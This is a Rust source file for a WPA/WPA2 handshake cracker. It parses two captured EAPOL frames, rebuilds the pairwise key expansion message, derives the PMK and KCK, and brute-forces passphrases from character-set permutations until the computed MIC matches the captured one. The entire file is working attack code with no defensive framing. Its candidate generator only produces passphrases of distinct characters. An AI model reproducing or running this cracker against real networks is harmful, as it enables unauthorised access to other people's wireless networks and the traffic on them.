use ring::pbkdf2;
use hmac::{Hmac, Mac};
use sha1::Sha1;

use std::collections::HashMap;
use std::io::{BufReader, Read};
use std::fs::File;

use itertools::Itertools;

use crate::config::*;

type HmacSha1 = Hmac<Sha1>;

pub struct WpaCracker {
    config: Config,
    message: Message,
    frame802: Vec<u8>,
    mic: Vec<u8>,
}

impl WpaCracker {
    pub fn new(config: Config) -> Result<Self, String> {
        let mut eapols = HashMap::<String, Vec<u8>>::new();
        for i in 0..config.eapols.len() {
            match Self::read_bytes(config.eapols[i].as_str()) {
                Ok(bytes) => eapols.insert(format!("eapol{}", i+1), bytes),
                Err(err) => return Err(err)
            };
        }

        let eapol1 = eapols.get("eapol1").unwrap();
        let eapol2 = eapols.get("eapol2").unwrap();

        Ok(Self {
            mic: (&eapol2[34..][81..97]).to_vec(),
            frame802: (&eapol2[34..]).to_vec(),
            message: Message::new(&eapol1, &eapol2),
            config,
        })
    }

    fn read_bytes(filename: &str) -> Result<Vec<u8>, String> {
        let mut bytes_content = Vec::new();
        let file = File::open(filename);
        if let Err(_) = file {
            return Err(format!("Could not open '{}'", filename));
        }

        let mut reader = BufReader::new(file.unwrap());
        reader.read_to_end(&mut bytes_content).unwrap();
        Ok(bytes_content)
    }

    pub fn run(&mut self) {
        let zeroed_frame = [
            &self.frame802[..81],
            b"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
            &self.frame802[97..]
        ]
        .concat();

        let charset = self.config.charset.iter()
            .map(|arg| match arg {
                CharSet::LowerCase(charset) => charset.to_owned(),
                CharSet::UpperCase(charset) => charset.to_owned(),
                CharSet::Digits(digits) => digits.to_owned()
            })
            .collect::<Vec<String>>()
            .concat();

        for passphrase in charset.chars().permutations(self.config.max).unique() {
            println!("[*] Trying with passphrase: {}", passphrase.iter().join(""));
            let mut pmk = [0u8; 32];
            pbkdf2::derive(
                pbkdf2::PBKDF2_HMAC_SHA1, 
                std::num::NonZeroU32::new(4096).unwrap(), 
                &self.config.ssid.to_string().trim().as_bytes(), 
                passphrase.iter().join("").trim().as_bytes(), 
                &mut pmk);

            let mut ptk_hmac = HmacSha1::new_from_slice(&pmk).unwrap();
            ptk_hmac.update(self.message.as_bytes());
            let kck = &ptk_hmac.finalize().into_bytes()[..16];

            let mut calculated_mic_hmac = HmacSha1::new_from_slice(&kck).unwrap();
            calculated_mic_hmac.update(&zeroed_frame);
            let calculated_mic = &calculated_mic_hmac.finalize().into_bytes()[..16];

            if self.mic == calculated_mic {
                println!("\n[+] Passphrase found: {}\n", passphrase.iter().join("").as_str());
                break;
            }
        }
    }
}

pub struct Message {
    content: Vec<u8>
}

impl Message {
    pub fn new(eapol1: &[u8], eapol2: &[u8]) -> Self {
        let ap_mac: Vec<u8> = (&eapol1[4..10]).to_vec();
        let sta_mac: Vec<u8> = (&eapol2[4..10]).to_vec();
        let anonce: Vec<u8> = (&eapol1[51..83]).to_vec();
        let snonce: Vec<u8> = (&eapol2[51..83]).to_vec();

        let mut msg: Vec<u8> = Vec::new();
        let mut bytes: Vec<&Vec<u8>> = Vec::new();

        let pairwise_expansion = ("Pairwise key expansion\x00".as_bytes()).to_vec();
        let null_byte = ("\x00".as_bytes()).to_vec();

        let (max_mac, min_mac) = Self::sort(&ap_mac, &sta_mac).unwrap();
        let (max_nonce, min_nonce) = Self::sort(&anonce, &snonce).unwrap();

        bytes.push(&pairwise_expansion);
        bytes.push(min_mac);
        bytes.push(max_mac);
        bytes.push(min_nonce);
        bytes.push(max_nonce);
        bytes.push(&null_byte);

        for vec in bytes.iter() {
            for ch in vec.iter() {
                msg.push(*ch);
            }
        }

        let mut content = Vec::new();
        for byte in msg.iter() {
            content.push(*byte);
        }

        Self { content }
    }

    fn sort<'m>(in_1: &'m Vec<u8>, in_2: &'m Vec<u8>) -> Result<(&'m Vec<u8>, &'m Vec<u8>), Box<dyn std::error::Error>> {
        if in_1.len() != in_2.len() {
            panic!("Input arguments don't match!");
        }

        for i in 0..in_1.len() {
            if in_1[i] < in_2[i] {
                return Ok((in_2, in_1));
            } else if in_1[i] > in_2[i] {
                return Ok((in_1, in_2));
            }
        }

        return Ok((in_1, in_2));
    }

    pub fn as_bytes(&self) -> &Vec<u8> {
        &self.content
    }
}
